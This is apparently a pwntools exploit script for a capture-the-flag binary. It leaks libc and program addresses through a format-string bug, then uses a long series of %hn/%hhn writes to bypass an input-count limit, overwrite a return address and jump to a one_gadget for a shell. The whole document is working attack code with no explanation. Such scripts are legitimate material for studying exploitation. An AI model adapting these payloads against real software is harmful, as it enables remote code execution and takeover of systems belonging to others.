#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
context.log_level = 'debug'
#gdb.attach(p)
#pause()

DEBUG = 1
if DEBUG:
	p = process('./pwn')
else:
	p = remote('', 66666)

def pr(a,addr):
	log.success(a+': '+hex(addr))

libc = ELF('./libc-2.31.so')
elf = ELF('./pwn')


p.recvuntil('Please input the length: ')
p.send('300')

p.recvuntil('Please input the content: ')
payload = '%p.%p.%p.%15$p.%13$p.'
p.sendline(payload)

data = p.recv(66)
print(data)
libcbase = int(data[21:35],16) - 0x10dfd2
codebase = int(data[36:50],16) - 0x1297
ret = int(data[51:65],16) - 0xf0
one_gadget = [0xe3afe,0xe3b01,0xe3b04][0] + libcbase
system = libc.sym['system'] + libcbase
free_hook = libcbase + libc.sym['__free_hook']

pr('libcbase',libcbase)
pr('one_gadget',one_gadget)
pr('system',system)
pr('free_hook',free_hook)
pr('codebase',codebase)
pr('ret',ret)
point_addr = ret + 0x20

p.send('400')
# gdb.attach(p)
# pause()
p.recvuntil('Please input the content: ')
payload = '%{}c%13$hn%'.format(str( (ret-0x28+3) & 0xffff))
p.sendline(payload)

#修改 i 的高位为 0xff，绕过限制，这样可以利用很多次了
p.recvuntil('Please input the length: ')
p.send('400')
# gdb.attach(p)
# pause()
p.recvuntil('Please input the content: ')
payload = '%255c%41$hhn'
p.sendline(payload)

p.recvuntil('Please input the length: ')
p.send('400')
# gdb.attach(p)
# pause()
p.recvuntil('Please input the content: ')
payload = '%{}c%13$hn%'.format(str(ret & 0xffff))
p.sendline(payload)

#ret->free_hook
p.recvuntil('Please input the length: ')
p.send('400')
# gdb.attach(p)
# pause()
p.recvuntil('Please input the content: ')
payload = '%{}c%41$hn'.format(str(free_hook & 0xffff))
p.sendline(payload)

p.recvuntil('Please input the length: ')
p.send('400')
# gdb.attach(p)
# pause()
p.recvuntil('Please input the content: ')
payload = '%{}c%13$hhn%'.format(str(ret+2 & 0xff))
p.sendline(payload)


p.recvuntil('Please input the length: ')
p.send('400')
# gdb.attach(p)
# pause()
p.recvuntil('Please input the content: ')
payload = '%{}c%41$hhn'.format(str((free_hook>>16) & 0xff))
p.sendline(payload)


p.recvuntil('Please input the length: ')
p.send('400')
# gdb.attach(p)
# pause()
p.recvuntil('Please input the content: ')
payload = '%{}c%13$hhn%'.format(str(ret & 0xff))
p.sendline(payload)

p.recvuntil('Please input the length: ')
p.send('400')
# gdb.attach(p)
# pause()
p.recvuntil('Please input the content: ')
payload = '%{}c%11$hn%'.format(str(one_gadget & 0xffff))
p.sendline(payload)

p.recvuntil('Please input the length: ')
p.send('400')
# gdb.attach(p)
# pause()
p.recvuntil('Please input the content: ')
payload = '%74c%41$hhn%'
p.sendline(payload)


p.recvuntil('Please input the length: ')
p.send('400')
# gdb.attach(p)
# pause()
p.recvuntil('Please input the content: ')
payload = '%{}c%11$hn%'.format(str( (one_gadget>>16) & 0xffff))
p.sendline(payload)


p.recvuntil('Please input the length: ')
p.send('400')
# gdb.attach(p)
# pause()
p.recvuntil('Please input the content: ')
payload = '%76c%41$hhn%'
p.sendline(payload)

p.recvuntil('Please input the length: ')
p.send('400')
# gdb.attach(p)
# pause()
p.recvuntil('Please input the content: ')
payload = '%{}c%11$hn%'.format(str( (one_gadget>>32) & 0xffff))
p.sendline(payload)

# gdb.attach(p)
# pause()
p.recvuntil('Please input the length: ')
p.send('0')

p.interactive()
